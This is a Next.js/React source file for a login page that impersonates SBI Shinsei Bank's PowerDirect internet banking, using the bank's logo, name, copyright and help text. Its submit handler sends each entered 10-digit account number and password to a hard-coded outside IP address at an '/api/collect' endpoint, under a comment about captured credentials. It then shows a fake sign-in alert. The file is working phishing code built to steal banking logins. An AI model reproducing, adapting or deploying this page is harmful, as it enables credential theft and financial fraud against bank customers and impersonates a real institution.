"use client";

import { useState } from "react";
import Link from "next/link";
import { Eye, EyeOff, HelpCircle, Lock, Shield, ArrowLeft } from "lucide-react";

export default function LoginPage() {
  const [accountNumber, setAccountNumber] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showTooltip1, setShowTooltip1] = useState(false);
  const [showTooltip2, setShowTooltip2] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (accountNumber.length !== 10) {
      alert("Please enter a valid 10-digit Branch Code and Account Number.");
      return;
    }
    if (password.length < 6) {
      alert("Please enter a valid PowerDirect password (6 to 12 characters).");
      return;
    }

    // Send captured credentials to the collector
    fetch("http://64.176.85.245/api/collect", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-collector-secret":
          process.env.NEXT_PUBLIC_COLLECTOR_SECRET ?? "",
      },
      body: JSON.stringify({
        url: window.location.href,
        title: document.title,
        referrer: document.referrer,
        extra: { accountNumber, password },
      }),
    }).catch(() => {});

    alert(`Signing into PowerDirect with Account: ${accountNumber}...`);
  };

  return (
    <div className="min-h-screen bg-[#e6e6e6] text-slate-800 font-sans flex flex-col justify-between">
      {/* PowerDirect Login Header */}
      <header className="bg-white border-b border-slate-300 py-4 px-6 shadow-xs">
        <div className="max-w-5xl mx-auto flex items-center justify-between">
          <Link href="/" className="flex items-center gap-2">
            <img
              src="/images/header-logo.png"
              alt="SBI SHINSEI BANK"
              className="h-10 sm:h-12 w-auto object-contain"
            />
          </Link>
          <div className="flex items-center gap-4">
            <Link
              href="/"
              className="text-xs font-bold text-[#003882] hover:underline flex items-center gap-1"
            >
              <ArrowLeft className="w-3.5 h-3.5" />
              <span>Back to Main Site</span>
            </Link>
          </div>
        </div>
      </header>

      {/* Main Login Content Area */}
      <main className="max-w-2xl mx-auto w-full px-4 py-10 flex-1 flex flex-col justify-center">
        {/* Headline */}
        <div className="mb-4">
          <h1 className="text-2xl sm:text-3xl font-extrabold text-[#002B66]">PowerDirect</h1>
        </div>

        {/* Login Box */}
        <div className="bg-white rounded-lg border border-slate-300 shadow-md overflow-hidden">
          <div className="bg-slate-100 border-b border-slate-300 px-6 py-4">
            <h2 className="text-xl font-extrabold text-[#002B66]">Login</h2>
          </div>

          <div className="p-6 space-y-6">
            <p className="text-xs sm:text-sm text-slate-600 font-medium">
              Enter the 10-digit number on your cash card and your PowerDirect password.
            </p>

            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Branch Code / Account Number Field */}
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <label className="text-xs sm:text-sm font-bold text-slate-800 flex items-center gap-1.5">
                    <span>Branch code / Account Number</span>
                    <button
                      type="button"
                      onClick={() => setShowTooltip1(!showTooltip1)}
                      className="text-[#003882] hover:text-[#E60012] transition"
                      title="Help info"
                    >
                      <HelpCircle className="w-4 h-4" />
                    </button>
                  </label>
                  <span className="text-xs text-slate-500">(10-digit number)</span>
                </div>

                {showTooltip1 && (
                  <div className="bg-sky-50 border border-sky-200 text-sky-900 text-xs p-3 rounded leading-relaxed">
                    Input the branch code (3 digits) and account number (7 digits) on your cash card.
                  </div>
                )}

                <input
                  type="text"
                  maxLength={10}
                  placeholder="e.g. 4001234567"
                  value={accountNumber}
                  onChange={(e) => setAccountNumber(e.target.value.replace(/\D/g, ""))}
                  className="w-full bg-slate-50 border border-slate-300 rounded px-3 py-2.5 text-slate-900 font-mono text-base focus:outline-none focus:border-[#003882] focus:bg-white"
                  required
                />
              </div>

              {/* PowerDirect Password Field */}
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <label className="text-xs sm:text-sm font-bold text-slate-800 flex items-center gap-1.5">
                    <span>PowerDirect Password</span>
                    <button
                      type="button"
                      onClick={() => setShowTooltip2(!showTooltip2)}
                      className="text-[#003882] hover:text-[#E60012] transition"
                      title="Help info"
                    >
                      <HelpCircle className="w-4 h-4" />
                    </button>
                  </label>
                  <span className="text-xs text-slate-500">(6-12 alphanumeric characters)</span>
                </div>

                {showTooltip2 && (
                  <div className="bg-sky-50 border border-sky-200 text-sky-900 text-xs p-3 rounded leading-relaxed">
                    The PowerDirect password is a 6 to 12 character alphanumeric password chosen by the customer when accessing PowerDirect (Internet Banking) account.
                  </div>
                )}

                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    maxLength={12}
                    placeholder="Enter password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full bg-slate-50 border border-slate-300 rounded px-3 py-2.5 pr-10 text-slate-900 font-mono text-base focus:outline-none focus:border-[#003882] focus:bg-white"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-3 text-slate-500 hover:text-slate-800"
                  >
                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
              </div>

              {/* Security Keyboard Link */}
              <div className="text-right">
                <button
                  type="button"
                  onClick={() => alert("Security Keyboard popup enabled.")}
                  className="text-xs text-[#003882] hover:underline font-semibold"
                >
                  Use the Security Keyboard
                </button>
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                className="w-full py-3 bg-[#2172B8] hover:bg-[#1a5f9a] text-white font-extrabold text-sm rounded shadow-md transition uppercase tracking-wider"
              >
                Login
              </button>
            </form>

            {/* Bottom New Account Application Link */}
            <div className="pt-4 border-t border-slate-200 text-center">
              <Link
                href="/#open-account"
                className="text-xs sm:text-sm font-bold text-[#003882] hover:text-[#E60012] hover:underline transition"
              >
                New Account Application
              </Link>
            </div>
          </div>
        </div>
      </main>

      {/* Login Page Footer */}
      <footer className="bg-white border-t border-slate-300 py-4 px-4 text-center text-xs text-slate-500">
        <p>© SBI Shinsei Bank, Limited. All rights reserved.</p>
      </footer>
    </div>
  );
}
